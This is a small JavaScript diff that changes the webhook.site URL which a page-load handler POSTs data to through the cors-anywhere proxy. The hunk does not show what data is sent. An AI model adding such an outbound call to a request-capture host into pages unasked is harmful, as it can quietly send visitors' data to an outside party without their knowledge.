@@ -12,7 +12,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
         const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
-        const targetUrl = 'https://webhook.site/874df208-a3be-41d9-b1c2-fd5b8668a3ce';
+        const targetUrl = 'https://webhook.site/76bef3db-5c1d-4581-8abd-95c235cc7e21';
 
         fetch(proxyUrl + targetUrl, {
             method: 'POST',
